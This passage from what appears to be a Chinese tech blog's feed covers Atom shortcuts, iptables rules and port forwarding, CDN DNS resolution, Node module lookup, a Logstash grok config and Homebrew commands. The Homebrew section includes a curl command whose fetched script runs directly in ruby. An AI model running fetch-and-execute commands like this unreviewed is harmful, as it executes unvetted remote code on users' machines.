核心框架体系结构</a></li><li><input checked="" disabled="" type="checkbox"> <a href="node-debugger.md">Node.js调试</a></li><li><input disabled="" type="checkbox"> <a href="prefetching-preloading-prebrowsing.md">网站预加载技术</a></li><li><input disabled="" type="checkbox"> <a href="html5-application-cache.md">HTML5 应用程序缓存</a></li><li><input disabled="" type="checkbox"> <a href="cors.md">跨域资源共享 CORS</a></li><li><input checked="" disabled="" type="checkbox"> <a href="compact-sparse-bundle-image.md">压缩稀疏镜像</a></li><li><input checked="" disabled="" type="checkbox"> <a href="git-delete-large-file.md">Git 清理大文件</a></li><li><input checked="" disabled="" type="checkbox"> <a href="bitwise-permission.md">位运算和权限管理系统</a></li><li><input disabled="" type="checkbox"> <a href="webp.md">WebP</a></li><li><input disabled="" type="checkbox"> <a href="mysql-binlog.md">MySQL Binlog</a></li><li><input checked="" disabled="" type="checkbox"> <a href="mysql-master-slave.md">MySQL 主从同步</a></li><li><input disabled="" type="checkbox"> <a href="make-makefile-cmake.md">make&amp;Makefile&amp;cmake</a></li><li><input disabled="" type="checkbox"> <a href="algorithmic-analysis.md">算法复杂度分析</a></li><li><input checked="" disabled="" type="checkbox"> <a href="intellij-keymap.md">Intellij快捷键</a></li><li><input checked="" disabled="" type="checkbox"> <a href="2fa.md">两步验证</a></li><li><input checked="" disabled="" type="checkbox"> <a href="java-logging.md">Java 中的日志库</a></li><li><input checked="" disabled="" type="checkbox"> <a href="vim.md">Vim 入门</a></li><li><input checked="" disabled="" type="checkbox"> <a href="zookeeper.md">Zookeeper 快速开始</a></li><li><input checked="" disabled="" type="checkbox"> <a href="kafka.md">Kafka 快速开始</a></li><li><input disabled="" type="checkbox"> <a href="select-vs-poll-vs-epoll.md">select vs poll vs epoll</a></li><li><input checked="" disabled="" type="checkbox"> <a href="java-lambda.md">Java Lambda</a></li><li><input checked="" disabled="" type="checkbox"> <a href="http.md">http</a></li><li><input disabled="" type="checkbox"> <a href="http2.md">http2</a></li><li><input checked="" disabled="" type="checkbox"> <a href="git.md">git</a></li><li><input checked="" disabled="" type="checkbox"> <a href="async-await.md">async&#x2F;await</a></li><li><input checked="" disabled="" type="checkbox"> <a href="dig.md">dig</a></li><li><input disabled="" type="checkbox"> [分布式系统]</li><li><input disabled="" type="checkbox"> <a href="https://github.com/tencent-wechat/phxsql">分布式数据库</a></li><li><input checked="" disabled="" type="checkbox"> <a href="consistent-hashing.md">一致性Hash</a></li><li><input checked="" disabled="" type="checkbox"> <a href="nginx-root-alias.md">nginx-root-alias</a></li><li><input checked="" disabled="" type="checkbox"> <a href="nginx-rewrite.md">nginx-rewrite</a></li><li><input checked="" disabled="" type="checkbox"> <a href="viewport.md">viewport</a></li><li><input checked="" disabled="" type="checkbox"> <a href="v8-heapdump.md">v8堆内存分析</a></li><li><input checked="" disabled="" type="checkbox"> <a href="nginx-proxy-cache.md">Nginx缓存配置</a></li><li><input checked="" disabled="" type="checkbox"> <a href="chunked-transfer-encoding.md">HTTP 分块传输编码</a></li><li><input checked="" disabled="" type="checkbox"> <a href="linux-user-group.md">Linux 用户和用户组</a></li><li><input checked="" disabled="" type="checkbox"> <a href="mini-rpc.md">迷你RPC</a></li><li><input checked="" disabled="" type="checkbox"> <a href="traceroute.md">路由诊断</a></li><li><input checked="" disabled="" type="checkbox"> <a href="socks5.md">SOCKS5</a></li><li><input checked="" disabled="" type="checkbox"> <a href="browserify.md">Browserify</a></li><li><input disabled="" type="checkbox"> <a href="java.util.concurrent.md">Java并发</a></li><li><input disabled="" type="checkbox"> <a href="http.md">HTTP协议</a></li><li><input checked="" disabled="" type="checkbox"> <a href="chrome.md">Chrome使用及配置</a></li><li><input checked="" disabled="" type="checkbox"> <a href="dns.md">DNS协议</a></li><li><input checked="" disabled="" type="checkbox"> <a href="install-gcc.md">GCC</a></li><li><input checked="" disabled="" type="checkbox"> <a href="shadowsocks.md">Shadowsocks</a></li><li><input checked="" disabled="" type="checkbox"> <a href="http-vary.md">Http Vary</a></li><li><input checked="" disabled="" type="checkbox"> <a href="linux-service.md">Linux服务</a></li><li><input checked="" disabled="" type="checkbox"> <a href="file-mode.md">文件模式</a></li><li><input checked="" disabled="" type="checkbox"> <a href="java8-optional.md">Java8 Optional</a></li><li><input disabled="" type="checkbox"> <a href="transaction-isolation.md">事物隔离级别</a></li><li><input disabled="" type="checkbox"> <a href="awk.md">awk</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>atom-keymap.md</title>
      <link href="/post/atom-keymap.html"/>
      <url>/post/atom-keymap.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>atom大部分快捷键和sublime一样</p></blockquote><h4 id="CMD"><a href="#CMD" class="headerlink" title="CMD +"></a>CMD +</h4><h4 id="CMD-K"><a href="#CMD-K" class="headerlink" title="CMD + K +"></a>CMD + K +</h4><ul><li>[cmd + k + b] 打开&#x2F;关闭侧边栏</li></ul><h4 id="CMD-SHIFT"><a href="#CMD-SHIFT" class="headerlink" title="CMD + SHIFT +"></a>CMD + SHIFT +</h4><h4 id="CTRL"><a href="#CTRL" class="headerlink" title="CTRL +"></a>CTRL +</h4><h4 id="CTRL-SHIFT"><a href="#CTRL-SHIFT" class="headerlink" title="CTRL + SHIFT +"></a>CTRL + SHIFT +</h4><ul><li>[ctrl + shift + c] 复制当前文件路径</li><li>[ctrl + shift + k] 删除当前行</li></ul><h4 id="CTRL-CMD"><a href="#CTRL-CMD" class="headerlink" title="CTRL + CMD +"></a>CTRL + CMD +</h4><ul><li>[ctrl + cmd + up] 上移当前行</li><li>[ctrl + cmd + down] 下移当前行</li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.jianshu.com/p/b8392151c0cd">【1】</a> <a href="http://www.imooc.com/article/1370">【2】</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> atom </tag>
            
            <tag> keymap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iptables</title>
      <link href="/post/iptables.html"/>
      <url>/post/iptables.html</url>
      
        <content type="html"><![CDATA[<h3 id="规则写法"><a href="#规则写法" class="headerlink" title="规则写法"></a>规则写法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables [-t table] COMMAND chain CRETIRIA -j ACTION</span><br></pre></td></tr></table></figure><p>-t table: 4个<code>filter</code> <code>nat</code> <code>mangle</code> <code>raw</code>，默认为<code>filter</code><br>COMMAND: 定义如何对规则进行管理<br>chain: 指定你接下来的规则到底是在哪个链上操作的，当定义策略的时候，是可以省略的<br>CRETIRIA: 指定匹配标准<br>-j ACTION: 指定如何进行处理</p><p>例如，开放80端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -A INPUT -p tcp --dport 80 -j ACCEPT</span><br></pre></td></tr></table></figure><p>这里的-t为<code>filter</code><br>COMMAND为<code>-A INPUT</code><br>CRETIRIA为<code>-p tcp --dport 80</code><br>-j为<code>ACCEPT</code>  </p><h4 id="COMMAND命令"><a href="#COMMAND命令" class="headerlink" title="COMMAND命令"></a>COMMAND命令</h4><ol><li><p>链管理命令<br> -P: 设置默认策略的（设定默认门是关着的还是开着的）<br> 默认策略一般只有两种</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -P INPUT (DROP|ACCEPT)  默认是关的/默认是开的</span><br></pre></td></tr></table></figure><p> 比如：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -P INPUT DROP</span><br></pre></td></tr></table></figure><p> 这就把默认规则给拒绝了。并且没有定义哪个动作，所以关于外界连接都会被拒绝。</p><p> -F: FLASH，清空规则链的(注意每个链的管理权限)</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -F PREROUTING</span><br><span class="line">iptables -t nat -F 清空nat表的所有链</span><br></pre></td></tr></table></figure><p> -N: 支持用户新建一个链</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -N Docker</span><br></pre></td></tr></table></figure><p> 创建后，使用-L命令查看发现会多一条规则链</p><p> -X: 用于删除用户自定义的空链<br> 使用方法跟-N相同，但是在删除之前必须要将里面的链给清空昂了</p><p> -E: 用来Rename chain主要是用来给用户自定义的链重命名</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -E Docker docker</span><br></pre></td></tr></table></figure><p> -Z: 清空链，及链中默认规则的计数器的（有两个计数器，被匹配到多少个数据包，多少个字节）</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -Z INPUT</span><br></pre></td></tr></table></figure></li><li><p>规则管理命令<br> -A: 追加，在当前链的最后新增一个规则</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br></pre></td></tr></table></figure><p> -I num : 插入，把当前规则插入为第几条</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 禁止192.168.3.167访问5601端口，插入到第一条规则</span><br><span class="line">iptables -I INPUT 1 -s 192.168.3.167 -p tcp --dport 5601 -j DROP</span><br></pre></td></tr></table></figure><p> -R num：Replays替换&#x2F;修改第几条规则</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 修改第一条规则</span><br><span class="line">iptables -R INPUT 1 -s 192.168.3.167 -p tcp --dport 5601 -j ACCEPT</span><br></pre></td></tr></table></figure><p> -D num：删除，明确指定删除第几条规则</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -D INPUT 1</span><br></pre></td></tr></table></figure></li><li><p>查看管理命令”-L”<br> 附加子命令<br> -n: 以数字的方式显示ip，它会将ip直接显示出来，如果不加-n，则会将ip反向解析成主机名<br> -v: 显示详细信息<br> -vv<br> -vvv: 越多越详细<br> -x: 在计数器上显示精确值，不做单位换算<br> –line-numbers: 显示规则的行号<br> -t nat：显示所有的关卡的信息  </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -L -n -v --line-numbers</span><br></pre></td></tr></table></figure></li></ol><h4 id="匹配标准CRETIRIA"><a href="#匹配标准CRETIRIA" class="headerlink" title="匹配标准CRETIRIA"></a>匹配标准CRETIRIA</h4><ol><li><p>通用匹配<br> -s：指定作为源地址匹配，这里不能指定主机名称，必须是IP</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 匹配IP是192.168.3.167请求</span><br><span class="line">iptables -I INPUT 1 -s 192.168.3.167 -p tcp --dport 5601 -j DROP</span><br></pre></td></tr></table></figure><p> 而且地址可以取反，加一个“!”表示除了哪个IP之外</p><p> -d：表示匹配目标地址</p><p> -p：用于匹配协议的（这里的协议通常有3种，TCP&#x2F;UDP&#x2F;ICMP）</p><p> -i eth0：从这块网卡流入的数据<br> 流入一般用在INPUT和PREROUTING上</p><p> -o eth0：从这块网卡流出的数据<br> 流出一般在OUTPUT和POSTROUTING上</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 打开回环</span><br><span class="line">iptables -A INPUT -i lo -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -o lo -j ACCEPT</span><br></pre></td></tr></table></figure></li><li><p>扩展匹配</p><ol><li>隐含扩展：对协议的扩展<br> -p tcp: TCP协议的扩展。一般有三种扩展<br> –dport XX-XX：指定目标端口,不能指定多个非连续端口,只能指定单个端口，比如<br> –dport 21  或者 –dport 21-23 (此时表示21,22,23)<br> –sport：指定源端口<br> –tcp-fiags：TCP的标志位（SYN,ACK，FIN,PSH，RST,URG）<br> 对于它，一般要跟两个参数：<br> 1.检查的标志位<br> 2.必须为1的标志位<br> –tcpflags syn,ack,fin,rst syn   &#x3D;    –syn<br> 表示检查这4个位，这4个位中syn必须为1，其他的必须为0。所以这个意思就是用于检测三次握手的第一次包的。对于这种专门匹配第一包的SYN为1的包，还有一种简写方式，叫做–syn<br> -p udp：UDP协议的扩展<br> –dport<br> –sport<br> -p icmp：icmp数据报文的扩展<br> –icmp-type：<br> echo-request(请求回显)，一般用8 来表示<br> 所以 –icmp-type 8 匹配请求回显数据包<br> echo-reply （响应的数据包）一般用0来表示</li><li>显式扩展（-m）<br> 扩展各种模块<br> -m multiport：表示启用多端口扩展<br> 之后我们就可以启用比如 –dports 21,23,80</li></ol></li></ol><h4 id="详解-j-ACTION"><a href="#详解-j-ACTION" class="headerlink" title="详解 -j ACTION"></a>详解 -j ACTION</h4><ol><li>DROP：悄悄丢弃<br> 一般我们多用DROP来隐藏我们的身份，以及隐藏我们的链表</li><li>REJECT：明示拒绝</li><li>ACCEPT：接受<br> custom_chain：转向一个自定义的链</li><li>DNAT</li><li>SNAT</li><li>MASQUERADE：源地址伪装</li><li>REDIRECT：重定向：主要用于实现端口重定向</li><li>MARK：打防火墙标记的</li><li>RETURN：返回<br> 在自定义链执行完毕后使用返回，来返回原规则链。</li></ol><h3 id="规则的先后顺序"><a href="#规则的先后顺序" class="headerlink" title="规则的先后顺序"></a>规则的先后顺序</h3><p>iptables规则的顺序很重要，配置不好规则会起不到预想的效果。<br>例如，现在有如下规则<br><img src="/images/QQ20160816-0@2x.jpg"><br>现在想要加一个规则，不让IP是192.168.3.167的用户访问5601端口<br>运行下面命令添加一条规则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT 1 -s 192.168.3.167 -p tcp --dport 5601 -j DROP</span><br></pre></td></tr></table></figure><p><img src="/images/QQ20160816-1@2x.jpg"><br>添加后，测试后发现根本没有起作用。为什么出现这种情况？因为规则在匹配时是从上到下，如果匹配成功就执行后面的Action了。在这里，IP是192.168.3.167的用户在请求5601端口时首先会匹配到第三条规则<br><img src="/images/QQ20160816-2@2x.jpg"><br>匹配后，直接就ACCEPT了。而最后一条拦截IP192.168.3.167的规则根本就不会执行。这种情况下，把拦截规则放到第一位就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -I INPUT 1 -s 192.168.3.167 -p tcp --dport 5601 -j DROP</span><br></pre></td></tr></table></figure><h3 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h3><p>1、 直接通过命令配置的规则在重启后就丢失了，要想重启后也生效。可以运行<code>service iptables save</code>命令保存。</p><p>2、 运行wget命令报不能dns不能解析错误<br>这个问题的主要原因是没有开放53端口，这个地方有个需要注意的。这里是从本地发起的请求，所以INPUT规则中应该指定–sport 53，OUTPUT规则中要指定–dport 53  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iptables -A OUTPUT -o eth0 -p udp --dport 53 -j ACCEPT</span><br><span class="line"></span><br><span class="line">iptables -A INPUT -i eth0 -p udp --sport 53 -j ACCEPT</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">配置完这个发现还是不行，原因类似。还需要开发从本地发起的HTTP，HTTPS请求。下面是完整的配置ssh、http、https的例子</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从外部发起的请求<br>iptables -A OUTPUT -o eth0 -p tcp –dport 443 -m state –state NEW,ESTABLISHED -j ACCEPT<br>iptables -A INPUT -i eth0 -p tcp –sport 443 -m state –state ESTABLISHED -j ACCEPT</p><p>从本机发起的请求<br>iptables -A OUTPUT -o eth0 -p tcp -m multiport –dports 22,80,443  -j ACCEPT<br>iptables -A INPUT -i eth0 -p tcp -m multiport –sports 22,80,443  -j ACCEPT</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">端口转发</span><br></pre></td></tr></table></figure><p>iptables -t nat -A PREROUTING -p tcp  –dport [local_port] -j DNAT –to [remote_ip]:[remote_port]<br>iptables -t nat -A POSTROUTING -j MASQUERADE</p><pre><code>阿里云-北京-纽约### 参考- [iptables详解](http://blog.chinaunix.net/uid-26495963-id-3279216.html)- [iptables命令详解和举例](http://blog.chinaunix.net/uid-9950859-id-98279.html)- [linux下用iptables做本机端口转发方法](http://blog.csdn.net/zzhongcy/article/details/42738285)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> iptables </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CDN</title>
      <link href="/post/cdn.html"/>
      <url>/post/cdn.html</url>
      
        <content type="html"><![CDATA[<h2 id="CDN原理"><a href="#CDN原理" class="headerlink" title="CDN原理"></a>CDN原理</h2><p><img src="/images/QQ20160815-0@2x.png"></p><ol><li>用户向浏览器输入<code>images.frim-x.com</code>这个域名，浏览器第一次发现本地没有dns缓存，则向网站的DNS服务器请求。①</li><li>网站的DNS域名解析器设置了<code>CNAME</code>，指向了<code>firm-x.cname.cdn.com</code>,请求指向了CDN网络中的智能DNS负载均衡系统。②</li><li>智能CDN’s DNS服务器，接收到请求之后，会根据用户IP找到最匹配的一项，并且计算距离这个用户最近的Edge服务器，将这个最优点的IP返回给用户。③④</li><li>用户向该IP节点（CDN服务器）发出请求。由于是第一次访问，CDN服务器会向原web站点请求，并缓存内容。请求结果发给用户。⑤</li></ol><p>这里的加速的核心点就是这个智能路由，它负责把用户引到最优的服务器。</p><h3 id="百度智能DNS"><a href="#百度智能DNS" class="headerlink" title="百度智能DNS"></a>百度智能DNS</h3><ul><li><p>CloudFlare DNS</p><p>  可以看到最终解析出来的A地址有<code>103.235.46.39</code>和<code>103.235.46.40</code>两个（这两个地址都位于百度香港机房，可能和CloudFlare服务海外用户有关）。可以看出经过两级<code>CNAME</code>到最终的IP。</p><p>  <img src="/images/dig-dns.png"></p><p>  <img src="/images/dig-dns-cname.png"></p><p>  <img src="/images/dig-dns-cname2.png"></p></li><li><p>114 DNS</p><p>  114DNS最终解析到的地址是<code>180.149.132.151</code>和<code>180.149.131.98</code>，这两个就是北京的机房。</p><p>  <img src="/images/dig-114-dns.png"></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> cdn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript类型转换</title>
      <link href="/post/javascript-type-conversion.html"/>
      <url>/post/javascript-type-conversion.html</url>
      
        <content type="html"><![CDATA[<h2 id="JavaScript类型转换"><a href="#JavaScript类型转换" class="headerlink" title="JavaScript类型转换"></a>JavaScript类型转换</h2><blockquote><p>粗体部分是要注意的</p></blockquote><p><img src="/images/QQ20160810-0@2x.png"></p><blockquote><p>对象转字符串会调用它的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/toString">toString()</a>方法，对象转数字会调用其<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/valueOf">valueOf()</a>方法。</p></blockquote><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol><li>《JavaScript权威指南》3.8 类型转换</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>node模块查找策略</title>
      <link href="/post/nodejs-module-loader.html"/>
      <url>/post/nodejs-module-loader.html</url>
      
        <content type="html"><![CDATA[<h3 id="Node-js模块查找策略"><a href="#Node-js模块查找策略" class="headerlink" title="Node.js模块查找策略"></a>Node.js模块查找策略</h3><p>首先在当前项目中<code>node_modules</code>目录中找，找不到去父文件夹<code>node_modules</code>找，一直到根目录下的<code>node_modules</code>。</p><p>可以在项目目录下建一个文件<code>module_path.js</code>，内为<code>console.log(module.paths);</code>。执行它就可以看到类似下面的结果了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[ &#x27;/Users/doog/Documents/Workspaces/node/node-wxbot/node_modules&#x27;,</span><br><span class="line">  &#x27;/Users/doog/Documents/Workspaces/node/node_modules&#x27;,</span><br><span class="line">  &#x27;/Users/doog/Documents/Workspaces/node_modules&#x27;,</span><br><span class="line">  &#x27;/Users/doog/Documents/node_modules&#x27;,</span><br><span class="line">  &#x27;/Users/doog/node_modules&#x27;,</span><br><span class="line">  &#x27;/Users/node_modules&#x27;,</span><br><span class="line">  &#x27;/node_modules&#x27; ]</span><br></pre></td></tr></table></figure><h4 id="NODE-PATH"><a href="#NODE-PATH" class="headerlink" title="NODE_PATH"></a>NODE_PATH</h4><p>另外，如果在上所说的<code>node_modules</code>中都没有找到，它会去看有没有一个叫<code>NODE_PATH</code>的环境变量。如果有，就去它下面找。<code>NODE_PATH</code>虽然可以解决安装的依赖包过多问题，但是用起来不方便，移植性不好。容易给不了解的人造成困惑，不建议使用。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>logstash</title>
      <link href="/post/logstash.html"/>
      <url>/post/logstash.html</url>
      
        <content type="html"><![CDATA[<h2 id="Logstash"><a href="#Logstash" class="headerlink" title="Logstash"></a>Logstash</h2><h3 id="配置示例"><a href="#配置示例" class="headerlink" title="配置示例"></a>配置示例</h3><p>适配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[2016-02-04 00:00:12.653] [INFO] access - pid: 12792 from 101.51.18.127:59983 at: 2016-02-03T16:00:09.516Z - [&quot;Wed, 03 Feb 2016 16:00:09 GMT \&quot;GET /api/dosomething 304 1 ms - - - 1.0\&quot; \&quot;xOXp3I1tHwXMyD2oA0MlWpYqD-PiCBhL 13471600000 171.139.119.147\&quot; \&quot;\&quot; \&quot;Mozilla/5.0 (Linux; Android 4.4.4; 2014811 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\&quot;&quot;]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">    stdin &#123; &#125;</span><br><span class="line">    file &#123;</span><br><span class="line">        path =&gt; [&quot;/root/2016-02-log/access.log-2016-02-04&quot;]</span><br><span class="line">        start_position =&gt; &quot;beginning&quot;</span><br><span class="line">        codec =&gt; multiline &#123;</span><br><span class="line">            pattern =&gt; &quot;^\[&quot;</span><br><span class="line">            negate =&gt; true</span><br><span class="line">            what =&gt; &quot;previous&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">    grok &#123;</span><br><span class="line">        match =&gt; &#123;</span><br><span class="line">            &quot;message&quot; =&gt; &quot;\[%&#123;TIMESTAMP_ISO8601&#125;\] \[%&#123;LOGLEVEL:level&#125;\] %&#123;WORD:type&#125; - pid: %&#123;POSINT:pid&#125; from %&#123;IP:host&#125;:%&#123;POSINT:port&#125; at: %&#123;TIMESTAMP_ISO8601&#125; - \[\&quot;%&#123;DAY&#125;, %&#123;MONTHDAY:monthday&#125; %&#123;MONTH:month&#125; %&#123;YEAR:year&#125; %&#123;TIME:time&#125; GMT%&#123;SPACE&#125;?%&#123;ISO8601_TIMEZONE&#125;? \\\&quot;%&#123;WORD:method&#125; %&#123;URIPATHPARAM:http_request&#125; %&#123;INT:http_status_code&#125; (?:%&#123;INT:response_time&#125; ms|-) - (?:%&#123;INT:content_length&#125;|-) - %&#123;NUMBER:http_version&#125;\\&quot; \\&quot;(?:%&#123;NOTSPACE:sid&#125;|NoSessionID) (?:%&#123;INT:mobile&#125;|NoMobile|NoUserInfo) %&#123;IP:remote-addr&#125;\\&quot; \\&quot;%&#123;DATA:referrer&#125;\\\&quot; \\\&quot;%&#123;DATA:user_agent&#125;\\\&quot;\&quot;\]&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        add_field =&gt; &#123;</span><br><span class="line">            &quot;timestamp&quot; =&gt; &quot;%&#123;year&#125;-%&#123;month&#125;-%&#123;monthday&#125; %&#123;time&#125;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    date &#123;</span><br><span class="line">        match =&gt; [&quot;timestamp&quot;,  &quot;YYYY-MMM-dd HH:mm:ss&quot;, &quot;YYYY-MM-dd HH:mm:ss.SSS&quot;, &quot;ISO8601&quot;]  </span><br><span class="line">        locale =&gt; &quot;en-US&quot;  </span><br><span class="line">        remove_field =&gt; [&quot;time&quot; ,&quot;month&quot;, &quot;monthday&quot;, &quot;year&quot;, &quot;timestamp&quot;]  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">output &#123;</span><br><span class="line">    stdout &#123;</span><br><span class="line">        codec =&gt; &quot;json&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    file &#123;</span><br><span class="line">        path =&gt; [&quot;/root/logdash-demo/access.log&quot;]</span><br><span class="line">        codec =&gt; &quot;json_lines&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p><a href="http://grokdebug.herokuapp.com/">http://grokdebug.herokuapp.com/</a></p><p><img src="/images/ZErzrBkkjE.gif"></p>]]></content>
      
      
      
        <tags>
            
            <tag> logstash </tag>
            
            <tag> log </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>brew.md</title>
      <link href="/post/brew.html"/>
      <url>/post/brew.html</url>
      
        <content type="html"><![CDATA[<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</span><br></pre></td></tr></table></figure><h3 id="搜索与安装"><a href="#搜索与安装" class="headerlink" title="搜索与安装"></a>搜索与安装</h3><ol><li><p>搜索</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">brew search vi</span><br><span class="line">brew search /正则表达式/ # 标准格式</span><br><span class="line">brew search /^vi/   #规定了只能是vi开头</span><br><span class="line">brew search /^vi\\w$/   #规定只能是vi开头并且只有三个字母</span><br></pre></td></tr></table></figure></li><li><p>安装</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew install vim </span><br><span class="line">brew install username/repo/vim</span><br></pre></td></tr></table></figure></li></ol><h3 id="卸载与更新"><a href="#卸载与更新" class="headerlink" title="卸载与更新"></a>卸载与更新</h3><ol><li><p>卸载</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 卸载对应包名字</span><br><span class="line">brew uninstall &lt;package_name&gt;</span><br><span class="line"></span><br><span class="line"># 列出过时的包</span><br><span class="line">brew outdated</span><br></pre></td></tr></table></figure></li><li><p>更新</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 更新过时的包，不带包名就跟新所有包</span><br><span class="line">brew upgrade [package_name]</span><br><span class="line"></span><br><span class="line"># 跟新HomeBrew自身</span><br><span class="line">brew update</span><br><span class="line"></span><br><span class="line"># 清除缓存</span><br><span class="line">brew cleanup [package_name]</span><br><span class="line"></span><br><span class="line"># 列出已经安装的包</span><br><span class="line">brew 